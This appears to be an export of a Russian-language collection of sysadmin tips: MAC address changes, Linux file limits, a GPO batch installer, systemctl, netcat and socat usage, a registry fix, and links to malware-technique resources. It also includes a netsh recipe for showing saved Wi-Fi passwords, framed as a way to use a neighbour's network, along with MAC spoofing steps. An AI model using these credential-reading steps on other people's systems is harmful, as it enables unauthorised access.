      <text:p text:style-name="P1">Самый простой способ узнать Mac-адрес - открыть командную строку («Win+R» → «cmd») и выполнить команду «ipconfig /all». Перед вами появится список всех сетевых адаптеров установленных в компьютере, а в поле «Физический адрес» будет указан Mac-адрес.</text:p>
      <text:p text:style-name="P1">Если необходимо изменить этот адрес:</text:p>
      <text:p text:style-name="P1">1. Запустите «Диспетчер устройств» (удобно найти через поиск).</text:p>
      <text:p text:style-name="P1">2. Кликните «Сетевые адаптеры» и выберите нужный для вас, ПКМ по нему → «Свойства».</text:p>
      <text:p text:style-name="P13">3. Перейдите во вкладку «Дополнительно» и выберите свойство «Сетевой адрес».</text:p>
      <text:p text:style-name="P13">4. В поле «Значение» пропишите новый Mac-адрес и примените изменения.</text:p>
      <text:p text:style-name="P4">MAC-адрес состоит из 12 символов - это цифры 0-9 и буквы A-F. Не начинайте первые два символа MAC-адреса с 0, а последним символом в адресе лучше используйте 2, 6, A или E, так как некоторые сетевые карты могут не осуществить подмену.</text:p>
      <text:p text:style-name="P1">Как найти количество открытых файлов в Linux</text:p>
      <text:p text:style-name="P1">Значение сохраняется в</text:p>
      <text:p text:style-name="P1"># cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P1">Проверка Hard лимит в Linux</text:p>
      <text:p text:style-name="P1"># ulimit -Hn</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Проверка Soft лимит в Linux</text:span></text:p>
      <text:p text:style-name="P1"># ulimit -Sn</text:p>
      <text:p text:style-name="P1">Чтобы просмотреть значения Hard и Soft для разных пользователей, переключите пользователя с «su» на пользователя, ограничения которого вы хотите проверить.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Например</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># su root</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Sn</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Hn</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как проверить количество системных дескрипторов файлов в Linux</text:p>
      <text:p text:style-name="P1">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MySQL / MariaDB или веб-сервер Apache.</text:p>
      <text:p text:style-name="P1">Вы можете увеличить лимит открытых файлов в Linux, отредактировав опцию ядра fs.file-max. Для этого используйте утилиту sysctl.</text:p>
      <text:p text:style-name="P1">Sysctl используется для настройки параметров ядра.</text:p>
      <text:p text:style-name="P1">Например, чтобы увеличить ограничение на количество открых файла до 500000, вы можете использовать следующую команду:</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1">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text:p>
      <text:p text:style-name="P1"># vi /etc/sysctl.conf</text:p>
      <text:p text:style-name="P1">Добавьте следующую команду:</text:p>
      <text:p text:style-name="P1">fs.file-max=500000</text:p>
      <text:p text:style-name="P1">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте:</text:p>
      <text:p text:style-name="P1"># cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P1">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p>
      <text:p text:style-name="P13"># sysctl -p</text:p>
      <text:p text:style-name="P13">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root, вам необходимо отредактировать следующий файл:</text:p>
      <text:p text:style-name="P1"># vi /etc/security/limits.conf</text:p>
      <text:p text:style-name="P1">Если вы администратор Linux,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 Команды, которые вы должны добавить, имеют следующие параметры:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">&lt;domain&gt;        &lt;type&gt;  &lt;item&gt;  &lt;value&gt;</text:span></text:p>
      <text:p text:style-name="P1">Вот пример установки Soft и Hard лимитов для пользователя dimo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11" loext:marker-style-name="T1"><text:span text:style-name="T2">dimon soft nofile 1024</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Batch-</text:span><text:span text:style-name="T3">скрипт</text:span><text:span text:style-name="T2">. </text:span><text:span text:style-name="T3">Устаналивает портабельную программу с сетевого диска на локальный диск пользователя и выводит ярлык на рабочий стол. </text:span></text:p>
      <text:p text:style-name="P1">Отредактированный под себя скрипт нужно прикрепить с помощью GPO в домене, как сценарий запуска при старте системы. Логи по установке пишутся на сетевой диск в отдельную папку.</text:p>
      <text:p text:style-name="P1">@echo off</text:p>
      <text:p text:style-name="P1">rem меняем кодировку чтобы использовать кириллицу</text:p>
      <text:p text:style-name="P1">chcp 1251 &gt;nul</text:p>
      <text:p text:style-name="P1">rem указываем директорию с программой для копирования (в нашем случае на сетевом диске М)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">set old_dir="M:\Programs\ExampleProgramPortable"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">rem указываем директорию куда копировать программу (в нашем случае в корень диска С)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">set new_dir="C:\ExampleProgramPortable"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">rem если директория уже существует пишем запись в лог (дата, время, файл называется именем пользователя), в противном случае копируем программу в директорию new_dir</text:p>
      <text:p text:style-name="P1">rem копируем ярлык программы в общую папку для всех пользователей, чтобы вывести на рабочий стол</text:p>
      <text:p text:style-name="P1">rem переименовываем ярлык кириллицей (если нужно)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rem </text:span><text:span text:style-name="T3">делаем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запись</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">лог</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">If Exist "%new_dir%\*.*" (</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo %date% %time:~-11,8% DIR exist already &gt;&gt; M:\logs\%username%.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">) Else (</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">xcopy %old_dir% %new_dir% /i /e /h /y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">xcopy "C:\ExampleProgramPortable\example_program.lnk" C:\Users\Public\Desktop</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rename "C:\Users\Public\Desktop\example_program.lnk" </text:span><text:span text:style-name="T3">Программа</text:span><text:span text:style-name="T2">.lnk</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo %date% %time:~-11,8% Example Program install successful &gt;&gt; M:\logs\%username%.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16">)</text:p>
      <text:p text:style-name="P16">Как просмотреть пароли от всех Wi-Fi, к которым вы подключались? Если вы забыли пароль от Wi-Fi соседа, а подключиться ну очень надо, есть отличный лайфхак с консолью Windows. Алгоритм действий такой:</text:p>
      <text:p text:style-name="P1">1. Нажмите сочетание «Win+R» и введите команду «cmd», чтобы открыть командную строку.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">2. </text:span><text:span text:style-name="T3">Введите</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">команду</text:span><text:span text:style-name="T2"> «netsh wlan show profiles». </text:span><text:span text:style-name="T3">На экране вы увидите список всех известных Wi-Fi сетей. Запомните имя нужной вам сети.</text:span></text:p>
      <text:p text:style-name="P1">3. Затем введите «netsh wlan show profile name=&lt;имя_сети&gt; key=clear». Команда выведет всю известную информацию о данной сети. В поле «Содержимое ключа» будет указан последний пароль, с которым вы подключались к этой сети.</text:p>
      <text:p text:style-name="P7">Служба WlanSvc в операционной системе Windows управляет всеми беспроводными соединениями (по Wi-Fi и Bluetooth). То есть, сервис отвечает за поиск, подключение, отключение и другие операции, которые необходимы для работы беспроводных подключений на компьютере.</text:p>
      <text:p text:style-name="P1">10 недооцененных ресурсов о методах вредоносного ПО. Это список различных ресурсов, где можно узнать больше о методах вредоносных программ, о том, как их анализировать и как улучшить обнаружение</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">unprotect.it</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lolbas-project.github.io</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">hijacklibs.net</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">malapi.io</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lots-project.com</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">github.com/Karneades/awesome-malware-persistence</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">github.com/m0nad/awesome-privilege-escalation</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">github.com/stuhli/awesome-event-ids</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">orkl.eu</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">vx-underground.org/windows.html</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Команды для получения сведений о системе, активности пользователей</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">date</text:span><text:span text:style-name="T3"> - вывести текущую дату и время</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cal</text:span><text:span text:style-name="T3"> - вывести календарь на текущий месяц</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">uptime</text:span><text:span text:style-name="T3"> - показать время с момента последней загрузки ОС.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> - сведения о пользователях, зарегистрировавшихся в системе</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">users</text:span><text:span text:style-name="T3"> - список имен пользователей, вошедших в систему.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - список пользователей, вошедших в систему по данным из специального файла /</text:span><text:span text:style-name="T2">var</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">log</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">wtmp</text:span><text:span text:style-name="T3">. Отображается имя, терминал, время входа </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адрес и т.п.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">ad</text:span><text:span text:style-name="T3"> - сведения о пользователях, вошедших в систему, с отображением в последней колонке имени компьютера с которого выполнен вход.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">F</text:span><text:span text:style-name="T3"> - отобразить время входа пользователей в систему, длительность сессий и время выхода.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> - отобразить сведения о выключениях, перезагрузках и изменениях уровня запуска системы.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3"> - отобразить сведения о сеансах пользователя </text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">last</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 10 </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">1 - отобразить сведения о десяти последних сеансах пользователя </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">1.</text:span></text:p>
      <text:p text:style-name="P18" loext:marker-style-name="T1"><text:span text:style-name="T2">lastlog</text:span><text:span text:style-name="T3"> - отобразить список всех пользователей и время их последнего входа в систему.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">whoami</text:span><text:span text:style-name="T3"> - имя, под которым вы в данный момент работаете в системе.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">finger</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> - показать информацию о </text:span><text:span text:style-name="T2">user</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">uname</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - отобразить все сведения о системе.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">uname</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">vr</text:span><text:span text:style-name="T3"> - отобразить номер выпуска операционной системы и версию ядра.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">df</text:span><text:span text:style-name="T3"> - отобразить информацию об использовании дисков.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">du</text:span><text:span text:style-name="T3"> - отобразить информацию об использовании текущего каталога</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">free</text:span><text:span text:style-name="T3"> - информация об использовании реальной и виртуальной памяти.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">whatis</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> - отобразить краткую информацию об </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> из базы данных документации.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">whereis</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> - где находится исполняемый модуль </text:span><text:span text:style-name="T2">app</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">which</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> - какой исполняемый модуль приложения </text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3"> будет запущен по умолчанию.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">man</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">command</text:span><text:span text:style-name="T3"> - отобразить справочную информацию для команды </text:span><text:span text:style-name="T2">command</text:span></text:p>
      <text:p text:style-name="P1">Черный экран на терминальном сервере windows server 2019</text:p>
      <text:p text:style-name="P1">Данная проблема возникает из-за большого количества правил для Cortana в ветке реестра:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Данные правила создаются при входе на терминальный сервер и должны удаляться при выходе, но увы этого не происходит</text:p>
      <text:p text:style-name="P1">Удаляем ветку и заново ее создаем:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\AppIso\FirewallRules"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">New-Item "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\AppIso\FirewallRules"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Создаем дополнительный ключ реестра, чтобы правила больше не создавались повторно:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" -Name "DeleteUserAppContainersOnLogoff" -Value ”1” <text:s/>-PropertyType "DWord"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">Перезагружаемся </text:p>
      <text:p text:style-name="P1">Управление сервисами systemd через утилиту systemctl</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl start name.service - </text:span><text:span text:style-name="T3">запуск</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl stop name.service - </text:span><text:span text:style-name="T3">остановка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl restart name.service - </text:span><text:span text:style-name="T3">перезапуск</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl try-restart name.service - </text:span><text:span text:style-name="T3">перезапуск</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">только</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">если</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">он</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запущен</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">systemctl reload name.service - </text:span><text:span text:style-name="T3">перезагрузка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">конфигурации</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span></text:p>
      <text:p text:style-name="P1">systemctl status name.service - проверка, запущен ли сервис с детальным выводом состояния сервиса</text:p>
      <text:p text:style-name="P1">systemctl is-active name.service - проверка, запущен ли сервис с простым ответом: active или inactive</text:p>
      <text:p text:style-name="P13">systemctl list-units --type service --all - отображение статуса всех сервисов</text:p>
      <text:p text:style-name="P13">systemctl enable name.service - активирует сервис (позволяет стартовать во время запуска системы)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl disable name.service - </text:span><text:span text:style-name="T3">деактивирует</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервис</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl reenable name.service - </text:span><text:span text:style-name="T3">деактивирует</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервис</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сразу</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">активирует</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">его</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl is–enabled name.service - </text:span><text:span text:style-name="T3">проверяет</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">активирован</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ли</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервис</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl list-unit-files --type service - </text:span><text:span text:style-name="T3">отображает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">все</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервисы</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">проверяет</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">какие</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">них</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">активированы</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl mask name.service - </text:span><text:span text:style-name="T3">заменяет</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">симлинком</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> /dev/null, </text:span><text:span text:style-name="T3">делая</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">юнит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">недоступным</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> systemd</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl unmask name.service - </text:span><text:span text:style-name="T3">возвращает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">делая</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">юнит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">доступным</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> system</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Полезные сетевые утилиты </text:span><text:span text:style-name="T2">linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Утилита управляет интерфейсами, сетевыми устройствами и туннелями. Всем сетевым стеком </text:span><text:span text:style-name="T2">linux</text:span><text:span text:style-name="T3">. Например: </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">addr</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Покажет список всех сетевых адресов. Тоже самое делает утилита </text:span><text:span text:style-name="T2">ifconfig</text:span><text:span text:style-name="T3"> без параметров. </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">route</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Покажет таблицу роутинга. Тоже самое сделает команда </text:span><text:span text:style-name="T2">route</text:span><text:span text:style-name="T3">. </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">link</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">set</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">eth</text:span><text:span text:style-name="T3">0 </text:span><text:span text:style-name="T2">up</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Поднимает интерфейс </text:span><text:span text:style-name="T2">eth</text:span><text:span text:style-name="T3">0. Это можно также сделать с помощью </text:span><text:span text:style-name="T2">ifconfig</text:span><text:span text:style-name="T3">. </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Так зачем она нужна если все ее команды можно выполнить с помощью других утилит? Дело в том, что во многие компактные дистрибутивы (например </text:span><text:span text:style-name="T2">Alpine</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">openwrt</text:span><text:span text:style-name="T3">) не используют </text:span><text:span text:style-name="T2">ifconfig</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">route</text:span><text:span text:style-name="T3"> и другие “большие” утилит. Там оставляют только </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3">. Вот с помощью нее и придется выполнять все сетевые задачи. </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Полное имя </text:span><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T3"> - на него она тоже откликается. Это утилита, позволяет слушать и выполнять </text:span><text:span text:style-name="T2">TCP</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">UDP</text:span><text:span text:style-name="T3"> соединении. </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">И так что может </text:span><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T3">? </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Открываем одно окно терминала и делаем там </text:span><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> 12345 это будет наш сервер. Отрываем другое окно и пишем в нем </text:span><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T3"> 127.0.0.1 12345 - это наш клиент. Печатаем там “</text:span><text:span text:style-name="T2">Hello</text:span><text:span text:style-name="T3">!” нажимаем </text:span><text:span text:style-name="T2">enter</text:span><text:span text:style-name="T3">. В первом окне видим эту фразу. Ура! Мы написали однонаправленный чат.</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Эта утилита пригодиться чтобы проверить жив ли сервер и слушает ли от вообще на этом порту? С помощью </text:span><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T3"> можно переслать файл и даже просканировать порты. </text:span><text:span text:style-name="T2">Http</text:span><text:span text:style-name="T3"> сервер еще можно написать.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">socat</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Это труба, которая позволяет соединить два сокета между собой. </text:span><text:span text:style-name="T2">Mysql</text:span><text:span text:style-name="T3"> слушает только на </text:span><text:span text:style-name="T2">local</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">socket</text:span><text:span text:style-name="T3"> а мы хотим на его ходить по </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3">. Выглядит это так: </text:span><text:span text:style-name="T2">socat</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">TCP</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">LISTEN</text:span><text:span text:style-name="T3">:3307,</text:span><text:span text:style-name="T2">reuseaddr</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">fork</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">UNIX</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">CONNECT</text:span><text:span text:style-name="T3">:/</text:span><text:span text:style-name="T2">var</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">lib</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mysql</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mysql</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">sock</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Конектор к </text:span><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T3"> из предыдущего примера: </text:span><text:span text:style-name="T2">socat</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">TCP</text:span><text:span text:style-name="T3">4:127.0.0.1:80 </text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Если вам нужно перебросить сокет в другое место присмотритесь к </text:span><text:span text:style-name="T2">socat</text:span><text:span text:style-name="T3"> он вам скорее всего поможет.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> </text:span></text:p>
